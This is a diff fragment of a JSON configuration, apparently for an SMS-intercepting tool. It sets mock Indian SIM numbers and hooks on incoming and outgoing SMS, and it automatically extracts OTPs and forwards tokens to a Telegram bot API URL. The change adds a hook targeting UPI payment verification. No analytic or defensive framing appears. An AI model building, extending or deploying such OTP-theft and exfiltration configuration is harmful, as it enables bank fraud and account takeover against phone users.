@@ -14,6 +14,7 @@
   "mock_phone_sim2": "+919876543211",
   "hook_incoming_sms": true,
   "hook_outgoing_sms": true,
+  "hook_upi_verification": true,
   "auto_extract_otp": true,
   "auto_forward_token": true,
   "forward_url": "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage",
